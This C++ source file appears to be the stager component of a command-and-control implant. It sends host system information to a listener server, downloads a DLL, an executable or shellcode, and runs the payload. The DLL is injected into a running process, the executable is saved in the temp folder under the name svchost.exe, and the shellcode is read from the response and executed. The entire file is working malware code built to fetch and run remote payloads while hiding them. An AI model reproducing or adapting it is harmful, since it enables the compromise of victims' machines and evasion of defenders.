#include "hermit.hpp"

BOOL LoadDLL()
{
    HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;

    // Get system information as json.
    std::wstring wInfoJson = GetInitialInfo();
    std::string sInfoJson = ConvertWstringToString(wInfoJson.c_str());

	WinHttpHandlers handlers = InitRequest(
		LISTENER_HOST_W,
		LISTENER_PORT
	);
	if (!handlers.hSession || !handlers.hConnect) {
		WinHttpCloseHandles(hSession, hConnect, NULL);
		return FALSE;
	}

	hSession = handlers.hSession;
	hConnect = handlers.hConnect;

    // Download a DLL file
    WinHttpResponse resp = SendRequest(
        hConnect,
        LISTENER_HOST_W,
        LISTENER_PORT,
        REQUEST_PATH_DOWNLOAD_W,
        L"POST",
        L"Content-Type: application/json\r\n",
		(LPVOID)sInfoJson.c_str(),
		(DWORD)strlen(sInfoJson.c_str())
    );
    if (!resp.bResult || resp.dwStatusCode != 200)
    {
        WinHttpCloseHandles(hSession, hConnect, NULL);
        return FALSE;
    }

    hRequest = resp.hRequest;

    // Set the temp file path
    std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
    std::wstring dllPath = GetEnvStrings(L"%TEMP%") + L"\\" + dllFileName;
    size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);

    // Download a DLL file
    bResults = ReadResponseData(hRequest, dllPath);
    if (!bResults)
    {
        WinHttpCloseHandles(hSession, hConnect, hRequest);
        return FALSE;
    }
    WinHttpCloseHandles(hSession, hConnect, hRequest);

    // Get target PID to inject DLL
    DWORD dwPid = GetProcessIdByName(TEXT(PAYLOAD_PROCESS));

    // Inject DLL
    if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
    {
        bResults = DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
    }
    else
    {
        return FALSE;
    }

    if (!bResults)
    {
        return FALSE;
    }

    return TRUE;
}

BOOL LoadExecutable()
{
    HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;

    // Get system information as json.
    std::wstring wInfoJson = GetInitialInfo();
    std::string sInfoJson = ConvertWstringToString(wInfoJson.c_str());

	WinHttpHandlers handlers = InitRequest(
		LISTENER_HOST_W,
		LISTENER_PORT
	);
	if (!handlers.hSession || !handlers.hConnect) {
		WinHttpCloseHandles(hSession, hConnect, NULL);
		return FALSE;
	}

	hSession = handlers.hSession;
	hConnect = handlers.hConnect;

    // Download an executable
    WinHttpResponse resp = SendRequest(
        hConnect,
        LISTENER_HOST_W,
        LISTENER_PORT,
        REQUEST_PATH_DOWNLOAD_W,
        L"POST",
        L"Content-Type: application/json\r\n",
		(LPVOID)sInfoJson.c_str(),
		(DWORD)strlen(sInfoJson.c_str())
    );
    if (!resp.bResult || resp.dwStatusCode != 200)
    {
        WinHttpCloseHandles(hSession, hConnect, NULL);
        return FALSE;
    }

    hRequest = resp.hRequest;

    // Set the temp file path
    std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
    std::wstring execPath = GetEnvStrings(L"%TEMP%") + L"\\" + execFileName;
    
    // Download an executable
    if (!ReadResponseData(hRequest, execPath))
    {
        WinHttpCloseHandles(hSession, hConnect, hRequest);
        return FALSE;
    }
    WinHttpCloseHandles(hSession, hConnect, hRequest);

    // Execute
    if (strcmp(PAYLOAD_TECHNIQUE, "direct-execution") == 0)
    {
        bResults = ExecuteFile(execPath);
    }
    else
    {
        return FALSE;
    }

    if (!bResults)
    {
        return FALSE;
    }

    return TRUE;
}

BOOL LoadShellcode()
{
    HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;

    // Get system information as json.
    std::wstring wInfoJson = GetInitialInfo();
    std::string sInfoJson = ConvertWstringToString(wInfoJson.c_str());

	WinHttpHandlers handlers = InitRequest(
		LISTENER_HOST_W,
		LISTENER_PORT
	);
	if (!handlers.hSession || !handlers.hConnect) {
		WinHttpCloseHandles(hSession, hConnect, NULL);
		return FALSE;
	}

	hSession = handlers.hSession;
	hConnect = handlers.hConnect;

    // Download shellcode
    WinHttpResponse resp = SendRequest(
        hConnect,
        LISTENER_HOST_W,
        LISTENER_PORT,
        REQUEST_PATH_DOWNLOAD_W,
        L"POST",
        L"Content-Type: application/json\r\n",
		(LPVOID)sInfoJson.c_str(),
		(DWORD)strlen(sInfoJson.c_str())
    );
    if (!resp.bResult || resp.dwStatusCode != 200)
    {
        WinHttpCloseHandles(hSession, hConnect, NULL);
        return FALSE;
    }

    hRequest = resp.hRequest;

    // Read & Execute a shellcode
    if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
    {
        bResults = ReadResponseShellcode(hRequest);
    }
    else
    {
        return FALSE;
    }

    if (!bResults)
    {
        WinHttpCloseHandles(hSession, hConnect, hRequest);
        return FALSE;
    }

    WinHttpCloseHandles(hSession, hConnect, hRequest);

    return TRUE;
}